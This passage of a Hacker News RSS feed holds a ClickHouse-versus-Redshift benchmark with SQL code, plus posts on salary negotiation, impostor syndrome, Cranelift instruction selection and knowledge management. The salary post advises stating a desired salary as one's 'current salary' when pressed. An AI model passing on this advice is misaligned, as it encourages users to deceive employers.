ORDER BY c DESC</code></pre>
</div><p>Q5. Where condition on the joined table.</p><div><pre><code>SELECT count(*)
FROM tripdata AS td
INNER JOIN taxi_zones AS tz ON td.pickup_location_id = tz.location_id
WHERE tz.zone = 'Midtown East'</code></pre>
</div><p>Here are the results (all numbers ‚Äî query time in seconds).</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
</tr>
</tbody>
</table>
</figure>
</div><p>Numbers do not look bad for a 1.3B rows dataset, but let‚Äôs look at comparisons.</p><p><h2>Redshift</h2>
</p><p>Now we repeat the same experience with Redshift. Redshift has a limited number of options for instance types to select from, the closest to m5.8xlarge instances we were using for ClickHouse is Redshift dc2.8xlarge instance. dc2.8xlarge is equipped with 32 vCPUs, 244GB of RAM and 2.5TB local SSD. It is important to note that Redshift forces users to use at least two dc2.8xlarge nodes per cluster, which raises the cost of the cluster to $230.40 per day.</p><div><figure><img src="https://lh4.googleusercontent.com/LEjpOZAvu0WdLq0iHeBye24z2_w-cJpeV2aufz_7BskH5yF_c4avbtI82kaGjzNYdkRjrdDbZh0O2tlc-giCk9yH7sRL9AJApEwE2ZGgdXYRyPdJIRszZAIYC2W91kiT3bD-lRsO" alt="Redshift Cluster" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><div><figure><img src="https://lh6.googleusercontent.com/YW5hRb-i-O5dL5ni-05MzdFEVU0-l4S7DOtDurzUVyyFWQYyvXpwcWhyXgPiXvrq9thD23j6bNmBlmZnZg-HQo2ch028pVXt1UyIyX_I2KWHhJ9nd7YOuakiKZKBu1Dvc8JzAgii" alt="" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>
</div><p>The data loading is easy using standard SQL COPY statement:</p><div><pre><code>COPY tripdata
FROM 's3://&lt;bucket_name&gt;/nyc_taxi_rides/data/tripdata/'
CREDENTIALS ‚Äò‚Äô
DELIMITER ','
  EMPTYASNULL
  ESCAPE
  GZIP
  MAXERROR 100000
  REMOVEQUOTES
  TRIMBLANKS
  IGNOREHEADER
  TRUNCATECOLUMNS;

[2020-07-28 19:43:57] completed in 8 m 26 s 624 ms</code></pre>
</div><p>This is very fast but it takes 80% more time compared to ClickHouse.&nbsp;</p><p>We run the same queries on Redshift using psql with query result cache disabled. Here are the results we‚Äôve got:</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse</strong><strong><br></strong><strong>m5.8xlarge</strong></td>
<td><strong>RedShift dc2.8xlarge x2</strong></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>506</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.59</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.82</td>
</tr>
<tr>
<td>Q3</td>
<td>1.78</td>
<td>2.8</td>
</tr>
<tr>
<td>Q4</td>
<td>0.94</td>
<td>0.64</td>
</tr>
<tr>
<td>Q5</td>
<td>0.33</td>
<td>0.45</td>
</tr>
</tbody>
</table>
</figure>
</div><p>As you can see, the query performance is close between the two databases. ClickHouse is slower on some queries, and faster on others. The total query time is lower with ClickHouse, but it is fair to say there is a tie here.</p><p>Let‚Äôs note, however, that Redshift is running on two nodes and may distribute data and query execution accordingly. For a fair comparison we need to add one more node to ClickHouse as well.</p><p><h2>Scaling ClickHouse Out</h2>
</p><p>Scaling from one to two servers requires some configuration and schema changes. Please refer to our webinar for the details of ClickHouse clustering:&nbsp; <a href="https://www.youtube.com/watch?v=78rrmC-2G6w">‚ÄúStrength in Numbers: Introduction to ClickHouse cluster performance‚Äù</a>. Since we run ClickHouse inside Kubernetes, we can use Altinity <a href="https://github.com/Altinity/clickhouse-operator">clickhouse-operator</a> for Kubernetes that turns adding a node to the cluster to a one click job.</p><p>When a new node is added to the ClickHouse cluster, data is not redistributed automatically. So there are two options:</p><div><ol>
<li>Reload data from S3 to the distributed table.</li>
<li>Reload data from the local to the distributed table with a simple INSERT SELECT statement.</li>
</ol>
</div><p>We tried the first approach in order to measure load time into a distributed table.</p><div><pre><code>CREATE TABLE tripdata_local ON CLUSTER '{cluster}' AS tripdata;

CREATE TABLE tripdata_d ON CLUSTER '{cluster}' AS tripdata Engine = Distributed('{cluster}', default, tripdata_local, rand());

INSERT INTO tripdata_d SELECT * FROM s3(...);</code></pre>
</div><p>Unfortunately, we hit a problem in ClickHouse at this point. The loading into the distributed table was 3-4 times slower due to lack of parallelisation when processing an insert. This is not acceptable by ClickHouse standards, and <a href="https://github.com/ClickHouse/ClickHouse/pull/14120">a fix</a> has been already submitted. So in order to speed things up until the new ClickHouse version is available, we made a trick and re-distributed the table manually using the following technique:</p><div><pre><code>INSERT INTO tripdata_local SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 0

0 rows in set. Elapsed: 84.095 sec. Processed 1.31 billion rows, 167.40 GB (15.59 million rows/s., 1.99 GB/s.)

INSERT INTO FUNCTION remote('second_node_address', default.tripdata_local) SELECT *
FROM tripdata
WHERE (cityHash64(*) % 2) = 1

0 rows in set. Elapsed: 335.122 sec. Processed 1.31 billion rows, 167.40 GB (3.91 million rows/s., 499.52 MB/s.)</code></pre>
</div><p>Here we used yet another table function ‚Äòremote()‚Äô that allows us to query between ClickHouse nodes. Note that we inserted data into a function, which is also a unique ClickHouse extension.</p><p>Below are query results for all tested configurations. We have also added Mark Litwintschick‚Äôs historical data in the last two columns for the reference.&nbsp;</p><div><figure>
<table>
<tbody>
<tr>
<td><strong>Query</strong></td>
<td><strong>ClickHouse </strong><strong><br></strong><strong>m5.8xlarge,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>ClickHouse m5.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><strong>RedShift dc2.8xlarge x2,</strong><strong><br></strong><strong>Aug 2020</strong></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-clickhouse-cluster.html"><strong>ClickHouse</strong><strong><br></strong><strong>c5d.9xlarge x3, Jan 2019</strong></a></td>
<td><a href="https://tech.marksblogg.com/billion-nyc-taxi-rides-redshift-large-cluster.html"><strong>Redshift ds2.8xlarge x6, June 2016</strong></a></td>
</tr>
<tr>
<td>Data load</td>
<td>280</td>
<td>n/a</td>
<td>506</td>
<td>n/a</td>
<td>673</td>
</tr>
<tr>
<td>Q1</td>
<td>0.62</td>
<td>0.35</td>
<td>0.59</td>
<td>0.69</td>
<td>1.25</td>
</tr>
<tr>
<td>Q2</td>
<td>1.11</td>
<td>0.58</td>
<td>0.82</td>
<td>0.58</td>
<td>2.25</td>
</tr>
<tr>
<td>Q3</td>
<td>1.‚Ä¶</td></tr></tbody></table></figure></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark">https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</a></em></p>]]>
            </description>
            <link>https://altinity.com/blog/clickhouse-and-redshift-face-off-again-in-nyc-taxi-rides-benchmark</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518926</guid>
            <pubDate>Fri, 18 Sep 2020 16:41:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Negotiate Your Salary as a Developer]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518792">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/how-to-negotiate-your-salary-as-a-developer | <a href="https://web.archive.org/web/*/https://catalins.tech/how-to-negotiate-your-salary-as-a-developer">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597245333467/5UNrmc9eH.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Knowing how to negotiate your salary as a developer is a must. When I received my first job offer, I was so excited to get a job, that I blindly accepted it. I did not even think of negotiating the salary. After all, I did not want to risk losing the offer. You have been in the same situation at least once, right?</p>
<p>However, most of the time, we leave money on the table by not negotiating our salary.</p>

<p>The first offer is never the best or the final offer. Companies always leave room in case the candidate wants to negotiate it. By not negotiating, you leave money on the table.</p>
<p>But how should I know how much to ask for? Use websites like Glassdoor to find the appropriate salary for a similar position and a similar experience. Once you have this information, adjust the salary based on your circumstances. At this point, you should have a rough idea of how much you deserve.</p>
<p>However, you should not blindly ask for more without reasons. If you ask for money, come with reasons why you deserve that compensation. Specify what you bring to the table.</p>

<p>I think I received this question millions of times. First of all, in many countries and states (USA), it is illegal to ask for the current salary. The rule of thumb is never to specify the salary you are making.</p>
<p>There are two options when answering this question:</p>
<ol>
<li>Avoid the question and try to move on</li>
<li>If they keep insisting, use the salary you want as your ‚Äúcurrent salary.‚Äù
Anyway, the best thing is never to mention the current salary. Companies and recruiters should not care about your current situation in terms of salary. </li>
</ol>

<p>Another reason why people do not negotiate is that they are afraid the company rescinds the offer. I do not think any respectable company is going to revoke the offer if you negotiate the salary.</p>
<p>In the worst case, they are going to cancel the offer. However, would you like to work for a company that does this? You just saved yourself from the trouble.</p>
<p>Therefore, do not be afraid to negotiate. In the worst case, they are going to say ‚Äòno‚Äô. In the best case, you are going to get better compensation. On the other hand, if they rescind the offer, you do not want to work for them anyway.</p>

<p>This advice is not actionable straight away, and it depends on the circumstances. However, having alternative offers helps a lot because it puts you in a favourable position. If your negotiation does not go well, you always have a second option. The company also knows that you have nothing to lose.</p>
<p>However, I want to repeat that it depends on the circumstances. The more offers you have, the better it is for you. One the other side, if you do not have multiple offers, it is not the end of the world. </p>
<p>Let us pretend you have alternative offers. How can you use them to leverage your position?</p>
<p>You could say something along these lines: ‚ÄúI have multiple offers from x, y, z with better compensation. However, I like your products and your mission the most. As a result, I would like to work here because I think it is a better fit for me.‚Äù Of course, this is just an example, but you can use something similar.</p>
<p>Thus, if you have other offers, learn how to use them at your advantage.</p>

<p>These are my tops tips when it comes to knowing how to negotiate your salary as a developer. The list is not exhaustive, and there are many other aspects of negotiating.</p>
<p>I hope the article gives you some insights and helps you see negotiating with other eyes. The essential thing is to negotiate your salaries. Otherwise, you leave money on the table.</p>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/how-to-negotiate-your-salary-as-a-developer</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518792</guid>
            <pubDate>Fri, 18 Sep 2020 16:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Impostor Syndrome ‚Äì A Developer's Best Friend]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518783">thread link</a>) | @fazlerocks
<br/>
September 18, 2020 | https://catalins.tech/impostor-syndrome-a-developers-best-friend | <a href="https://web.archive.org/web/*/https://catalins.tech/impostor-syndrome-a-developers-best-friend">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1597582091064/7sW4dzIjK.png?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><hr>

<p>Reading the title, you might say something is wrong with me. But I dare to repeat it. The impostor syndrome is a developer's best friend when appropriately managed. I also believe that the impostor syndrome is more prominent in software development due to the large volume of knowledge you need to possess, and the constant changing of tools and programming languages. The programming language and tools you are using today might become obsolete in one year. That means "starting from the zero" (an exaggeration to emphasise the point) again. It is a very dynamic environment where you have to learn continuously. The ones that survive are the ones that can adapt. </p>
<p>Thus, it is almost impossible to get rid of the impostor syndrome. Why not learn to live with it?</p>

<p>Let me tell you another thing. Almost all of us suffer from impostor syndrome. There is always someone better than us. There is always something that we do not know. There is always something to learn. A new tool gets released every day. A new technology or programming language emerges every once in a while. You can never learn and know all of them. Trying to keep up is very difficult as well. And that is how the syndrome creeps in. You start asking yourself questions such as "Will I ever make it?", "Will I ever be able to do x, y, z?", "Will I know technology x, y, z?", "What if I am an impostor?", and the list goes on. The answer is yes, yes, and yes,</p>
<p>By the way, the syndrome is even worse for beginners, who feel they are never going to make it in this field. Been there, done that. You will make it with persistent, hard work.</p>

<p>You are not the only one asking himself/herself those questions. The developer next to you at work has the same questions. The developer you follow on Twitter has the same questions. That YouTuber with 50000 subscribers has the same questions. I have the same questions, even though I have a job and I am doing very well.</p>
<p>You are not the only one with these questions, and you will never be. The impostor syndrome is part of us, and as I said, it is more prominent in our industry. Of course, some people deal with it better, so it is not that obvious they have it as well. But almost all of us have it, trust me.</p>

<p>First of all, you should know that it can be your best friend because it pushes you to become better. The feeling that you are not made for this industry, or that you do not know enough, could push you to learn more. As a result, you better yourself every day. I use the impostor syndrome as fuel, as motivation to become a better developer, and it works very well. Beware though; it can quickly push you to burn out. Trust me, you do not want that.</p>
<p>Secondly, whenever those questions and irrational thoughts creep into your mind, REMEMBER that all developers suffer from this syndrome. REMEMBER that there is always a developer better than you. But also REMEMBER that there is always a developer that is beneath you. REMEMBER that you can never know everything, and that is fine. You only need to know a handful of tools, which are relevant to your job. With perseverance and hard work, you can become a developer.</p>
<p>Will you become the best programmer? Probably no. Will you work at Amazon/Facebook/Google/Apple? Probably no. Will you make millions? Probably no. Will you develop the best next thing? Probably no. But guess what? That is fine. You do not have to do any of those to be a decent developer. Actually, most of us never achieve those goals.</p>

<ul>
<li>Almost all of us has the impostor syndrome.</li>
<li>You can make it in this industry with hard work.</li>
<li>You will never know everything, and that is fine.</li>
<li>There are always developers better than, but there are also developers worse than you.</li>
<li>You do not have to be a "superstar" developer. Being a decent developer is enough.</li>
</ul>
<blockquote>
<p>If you enjoyed the article, consider sharing it so more people can benefit from it! Also, feel free to @ me on Twitter with your opinions.</p>
</blockquote>
</div></div></section></div></div>]]>
            </description>
            <link>https://catalins.tech/impostor-syndrome-a-developers-best-friend</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518783</guid>
            <pubDate>Fri, 18 Sep 2020 16:27:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A New Backend for Cranelift, Part 1: Instruction Selection]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518724">thread link</a>) | @cfallin
<br/>
September 18, 2020 | https://cfallin.org/blog/2020/09/18/cranelift-isel-1/ | <a href="https://web.archive.org/web/*/https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>This post is the first in a three-part series about my recent work on
<a href="https://github.com/bytecodealliance/wasmtime/tree/main/cranelift">Cranelift</a>
as part of my day job at Mozilla. In this first post, I will set some context
and describe the instruction selection problem. In particular, I‚Äôll talk about
a revamp to the instruction selector and backend framework in general that
we‚Äôve been working on for the last nine months or so. This work has been
co-developed with my brilliant colleagues Julian Seward and <a href="https://benj.me/">Benjamin
Bouvier</a>, with significant early input from <a href="https://github.com/sunfishcode">Dan
Gohman</a> as well, and help from all of the
wonderful Cranelift hackers.</p>

<h2 id="background-cranelift">Background: Cranelift</h2>

<p>So what is Cranelift? The project is a compiler framework written in
<a href="https://www.rust-lang.org/">Rust</a> that is designed especially (but not
exclusively) for <a href="https://en.wikipedia.org/wiki/Just-in-time_compilation">just-in-time
compilation</a>. It‚Äôs a
general-purpose compiler: its most popular use-case is to compile
<a href="https://www.webassembly.org/">WebAssembly</a>, though several other frontends
exist, for example,
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cg_clif</a>, which adapts the
Rust compiler itself to use Cranelift. Folks at Mozilla and several other
places have been developing the compiler for a few years now.  It is the
default compiler backend for
<a href="https://github.com/bytecodealliance/wasmtime">wasmtime</a>, a runtime for
WebAssembly outside the browser, and is used in production in several other
places as well. We recently flipped the switch to turn on Cranelift-based
WebAssembly support in nightly Firefox on <a href="https://en.wikipedia.org/wiki/AArch64">ARM64
(AArch64)</a> machines, including most
smartphones, and if all goes well, it will eventually go out in a stable
Firefox release. Cranelift is developed under the umbrella of the <a href="https://bytecodealliance.org/">Bytecode
Alliance</a>.</p>

<p>In the past nine months, we have built a new framework in Cranelift for the
‚Äúmachine backends‚Äù, or the parts of the compiler that support particular CPU
instruction sets. We also added a new backend for AArch64, mentioned above, and
filled out features as needed until Cranelift was ready for production use in
Firefox. This blog post sets some context and describes the design process that
went into the backend-framework revamp.</p>

<p>It can be a bit confusing to keep all of the moving parts straight. Here‚Äôs a
visual overview of Cranelift‚Äôs place among various other components, focusing
on two of the major Rust crates (the Wasm frontend and the codegen backend) and
several of the other programs that make use of Cranelift:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-components.svg" alt="Figure: Cranelift and other components"></p>

<h2 id="old-backend-design-instruction-legalizations">Old Backend Design: Instruction Legalizations</h2>

<p>To understand the work that we‚Äôve done recently on Cranelift, we‚Äôll need to
zoom into the <code>cranelift_codegen</code> crate above and talk about how it <em>used to</em>
work. What is this ‚ÄúCLIF‚Äù input, and how does the compiler translate it to
machine code that the CPU can execute?</p>

<p>Cranelift makes use of
<a href="https://github.com/bytecodealliance/wasmtime/blob/main/cranelift/docs/ir.md">CLIF</a>,
or the Cranelift IR (Intermediate Representation) Format, to represent the code
that it is compiling. Every compiler that performs program optimizations uses
some form of an <a href="https://en.wikipedia.org/wiki/Intermediate_representation">Intermediate Representation
(IR)</a>: you can think
of this like a virtual instruction set that can represent all the operations a
program is allowed to do. The IR is typically simpler than real instruction
sets, designed to use a small set of well-defined instructions so that the
compiler can easily reason about what a program means. The IR is also
independent of the CPU architecture that the compiler eventually targets; this
lets much of the compiler (such as the part that generates IR from the input
programming language, and the parts that optimize the IR) be reused whenever
the compiler is adapted to target a new CPU architecture.  CLIF is in <a href="https://en.wikipedia.org/wiki/Static_single_assignment_form">Static
Single Assignment
(SSA)</a> form, and
uses a conventional <a href="https://en.wikipedia.org/wiki/Control-flow_graph">control-flow
graph</a> with basic blocks
(though it previously allowed extended basic blocks, these have been phased
out). Unlike many SSA IRs, it represents œÜ-nodes with block parameters
rather than explicit œÜ-instructions.</p>

<p>Within <code>cranelift_codegen</code>, before we revamped the backend design, the program
remained in CLIF throughout compilation and up until the compiler emitted the
final machine code. This might seem to contradict what we just said: how can
the IR be machine-independent, but also be the final form from which we emit
machine code?</p>

<p>The answer is that the old backends were built around the concept of
‚Äúlegalization‚Äù and ‚Äúencodings‚Äù. At a high level, the idea is that every
<em>Cranelift</em> instruction either corresponds to one <em>machine</em> instruction, or can
be replaced by a sequence of other <em>Cranelift</em> instructions. Given such a
mapping, we can refine the CLIF in steps, starting from arbitrary
machine-independent instructions from earlier compiler stages, performing edits
until the CLIF corresponds 1-to-1 with machine code. Let‚Äôs visualize this
process:</p>

<p><img src="https://cfallin.org/assets/2020-09-10-cranelift-legalization.svg" alt="Figure: legalization by repeated instruction expansion"></p>

<p>A very simple example of a CLIF instruction that has a direct ‚Äúencoding‚Äù to a
machine instruction is <code>iadd</code>, which just adds two integers. On essentially any
modern architecture, this should map to a simple ALU instruction that adds two
registers.</p>

<p>On the other hand, many CLIF instructions do not map cleanly. Some arithmetic
instructions fall into this category: for example, there is a CLIF instruction
to count the number of set bits in an integer‚Äôs binary representation
(<code>popcount</code>); not every CPU has a single instruction for this, so it might be
expanded into a longer series of bit manipulations. There are operations that
are defined at a higher semantic level, as well, that will necessarily be
lowered with expansions: for example, accesses to Wasm memories are lowered
into operations that fetch the linear memory base and its size, bounds-check
the Wasm address against the limit, compute the real address for the Wasm
address, and perform the access.</p>

<p>To compile a function, then, we iterate over the CLIF and find instructions
with no direct machine encodings; for each, we simply expand into the legalized
sequence, and then recursively consider the instructions in that sequence. We
loop until all instructions have machine encodings. At that point, we can emit
the bytes corresponding to each instruction‚Äôs encoding<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup>.</p>

<h2 id="growing-pains-and-a-new-backend-framework">Growing Pains, and a New Backend Framework?</h2>

<p>There are a number of advantages to the legacy Cranelift backend design, which
performs expansion-based legalization with a single IR throughout. As one might
expect, though, there are also a number of drawbacks. Let‚Äôs discuss a few of
each.</p>

<h3 id="single-ir-and-legalization-pros">Single IR and Legalization: Pros</h3>

<ol>
  <li>
    <p>By operating on a single IR all the way to machine-code emission, the same
optimizations can be applied at multiple stages. For example, consider a
legalization expansion that turns a high-level ‚Äúaccess Wasm memory‚Äù
instruction into a sequence of loads, adds and bounds-checks. If many such
sequences occur in one function, we might be able to factor out common
portions (e.g.: computing the base of the Wasm memory).  Thus the
legalization scheme exposes as much code as possible, at as many stages as
possible, to opportunities for optimization. The legacy Cranelift pipeline
in fact works in this way: it runs ‚Äúpre-opt‚Äù and ‚Äúpost-opt‚Äù optimization
passes, before and after legalization respectively.</p>
  </li>
  <li>
    <p>If <em>most</em> of the Cranelift instructions become one machine instruction, and
few legalizations are necessary, then this scheme can be very fast: it
becomes simply a single traversal to fill in ‚Äúencodings‚Äù, which were
represented by small indices into a table.</p>
  </li>
</ol>

<h3 id="single-ir-and-legalization-cons">Single IR and Legalization: Cons</h3>

<ol>
  <li>
    <p>Expansion-based legalization may not always result in
optimal code. So far we‚Äôve seen that legalization can convert from CLIF to
machine instructions with one-to-one or one-to-many mappings. However, there
are sometimes also <em>single</em> machine instructions that implement the behavior of
<em>multiple</em> CLIF instructions, i.e. a many-to-one mapping. In order to generate
efficient code, we want to be able to make use of these instructions.</p>

    <p>For example, on x86, an instruction that references memory can compute an
address like <code>base + scale * index</code>, where <code>base</code> and <code>index</code> are registers
and <code>scale</code> is 1, 2, 4, or 8. There is no notion of such an address mode in
CLIF, so we would want to pattern-match the raw <code>iadd</code> (add) and <code>ishl</code>
(shift) or <code>imul</code> (multiply) operations when they occur in the address
computation. Then, we would want to somehow select the encoding on the
<code>load</code> instruction based on the fact that its input is some specific
combination of adds and shifts/multiplies.  This seems to break the
abstraction that the encoding represents only that instruction‚Äôs operation.</p>

    <p>In principle, we could implement more general pattern matching for legalization
rules to allow many-to-one mappings. However, this would be a significant
refactor; and as long as we were reconsidering the design in whole, there were
other reasons to avoid patching the problem in this way.</p>
  </li>
  <li>
    <p>There is a conceptual difficulty with the single-IR approach: there is
no static representation of which instructions are expanded into which others
and it is difficult to reason about the correctness and termination properties
of legalization as a whole.</p>

    <p>Specifically, the expansion-based legalization rules must obey a partial
order among instructions: if A expands into a sequence including B, then B
cannot later expand into A. In practice, mappings were mostly one-to-one,
and for those that weren‚Äôt, there was a clear domain separation between the
‚Äúinput‚Äù high-level instructions and the ‚Äúmachine-level‚Äù instructions.
However, for more complex machines, or more complex matching schemes that
attempt to make better use of the target instruction set, this could become
a real difficulty for the machine-backend author to keep straight.</p>
  </li>
  <li>
    <p>There are efficiency concerns with expansion-based legalization. At
an algorithmic level, we prefer to avoid fixpoint loops (in this case,
‚Äúcontinue expanding until no more expansions exist‚Äù) whenever possible. The
runtime is bounded, but the bound is somewhat difficult to reason about,
because it depends on the maximum depth of chained expansions.</p>

    <p>The data structures that enable in-place editing are also much slower than
we would like. Typically, compilers store IR instructions in linked lists to
allow for in-place editing. ‚Ä¶</p></li></ol></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://cfallin.org/blog/2020/09/18/cranelift-isel-1/">https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</a></em></p>]]>
            </description>
            <link>https://cfallin.org/blog/2020/09/18/cranelift-isel-1/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518724</guid>
            <pubDate>Fri, 18 Sep 2020 16:22:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Z80, the 8-bit Number Cruncher (2011)]]>
            </title>
            <description>
<![CDATA[
Score 64 | Comments 56 (<a href="https://news.ycombinator.com/item?id=24518158">thread link</a>) | @elvis70
<br/>
September 18, 2020 | http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html | <a href="https://web.archive.org/web/*/http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>http://www.andreadrian.de/oldcpu/Z80_number_cruncher.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24518158</guid>
            <pubDate>Fri, 18 Sep 2020 15:39:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building an Ideal Knowledge Management System for Content Creators]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24518086">thread link</a>) | @laybak
<br/>
September 18, 2020 | https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators | <a href="https://web.archive.org/web/*/https://knowledgeartist.org/article/ideal-knowledge-management-system-content-creators">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p><span>In this article, I lay out a vision of the dream tools to help content creators manage and apply their cumulative learnings. I outline the desirable properties of such tools and how we can build them.</span></p> <p><span>Let's get started.</span></p>  <p><h3><span>Knowledge Synthesis vs Passive Consumption</span></h3></p> <p><span>I use the term "content creators" to refer to a variety of knowledge workers, including bloggers, video producers, researchers, journalists, and more. The many types of content creators are characterized by a common basic workflow: the process of consuming and synthesizing knowledge. Or more generally, learning and teaching. </span></p> <p><span>This is distinct from the mere passive consumption of information. It involves digesting information, trying to apply it, condensing it, sharing it, and making it your own. In the process, you understand the knowledge better yourself. And the output you create helps others learn.</span></p>  <p><h3><span>Ease of Capture</span></h3></p> <p><span>As you read, learn, or just live life, you come across many tidbits and ideas you want to remember. These are inspirations and materials that you can later make use of. </span></p> <p><span>But if you don't capture these ideas, you tend to lose them forever. And it is hard to generate relevant ideas on demand when you need them. So capturing is an always-on process, and your collection of ideas grows over time.</span></p> <p><span>The challenge with capturing ideas is that it is hard to know in advance when you will need them. If the friction to capture is too high, it simply won't happen. The capturing process must be effortless. </span></p>  <p><h3><span>Save from Anywhere</span></h3></p> <p><span>Ideas can come to you in many different contexts: conversations with friends, newsletters, books, podcasts, documentaries, walking a dog in the park, etc. The best ways to capture ideas are different for each scenario. You want to go with whichever method is the most convenient in the moment so you can resume whatever activity you were doing. </span></p> <p><span>As technology evolves, we would have an increasing variety of platforms or media we can use to save ideas. Currently, you can write it down on a piece of paper, take notes on your phone, leave a bookmark, highlight the passage, take a screenshot, and more.</span></p> <p><span>But in the future it seems inevitable that we would incorporate additional modes of inputs such as wearables like glasses with cameras, virtual reality recordings, and brain-computer interfaces.</span></p>  <p><h3><span>Integrated and Queryable Knowledge</span></h3></p> <p><span>As you use multiple tools, a problem that arises over time is that your captured knowledge becomes scattered across different places. Using a fragmented set of tools to manage your knowledge is costly. It makes it harder to retrieve any information you need. </span></p> <p><span>Currently, your book notes, product specs, and notes for online courses likely live in disparate platforms. We can do better. Your information should not be siloed. It should be searchable in one place. </span></p>  <p><h3><span>Customizable and Extensible</span></h3></p> <p><span>It is unlikely that any single tool will be the best knowledge management solution for all scenarios and workflows. No matter how well-designed a product is, there are use cases that are not accounted for, or are de-prioritized due to resource constraints. The best knowledge management tools you use should be extensible to fit your nuanced needs. Each tool you use needs to work well with the other components in your workflow, over a shared standard, open source code, or API. </span></p>  <p><h3><span>Free-form Digital Drawing</span></h3></p> <p><span>If I ask you to explain an abstract concept, one of the first things you would reach for is probably a pen, then paper or a whiteboard. This free-form drawing medium is expressive. It makes use of our spatial intuition. It is free-form. It helps you see otherwise non-obvious connections. But it is inconvenient to store, retrieve, and connect to existing knowledge. </span></p> <p><span>In contrast, a digital interface is easy to manipulate across platforms, but tends to be limited in expression. It tends to rely on text representation, which is often insufficient in conveying an idea, especially a complicated or abstract one.</span></p> <p><span>An ideal knowledge management system would marry the two to get us the best of both worlds: a digital interface that affords frictionless free-form drawing and is easy to maintain. Products such as </span> <a href="https://miro.com/" target="_blank"><span>Miro</span></a> <span> and </span> <a href="https://www.onenote.com/" target="_blank"><span>OneNote</span></a> <span> are a good step in this direction. </span></p>  <p><h3><span>Structured Knowledge &amp; Personal Knowledge Graph</span></h3></p> <p><span>The most common digital form of an idea is a </span> <em>note</em> <span>, typically stored in plaintext and organized in notebooks or folders. This is usually sufficient for the purpose of jotting down your thoughts. </span></p> <p><span>But these generic "Note" objects can become more useful when they are augmented with properties, relationships with other notes, and other metadata. These properties can be automatically extracted in the capturing process (e.g. "page number" and "book title" in a e-Book highlight), or custom-defined by the user (e.g. "years of experience required" on a "Job Posting" page). </span></p> <p><span>The interconnections between these individual notes can be structured in a </span> <a href="https://en.wikipedia.org/wiki/Knowledge_Graph" target="_blank"><span>knowledge graph</span></a> <span>, where an entity "Google" is connected to a collection of "Job" entities via the relationship "is hiring". A knowledge graph can be valuable in retrieving knowledge and answering queries. And search engines make extensive use of this to structure the world's knowledge. And on an individual 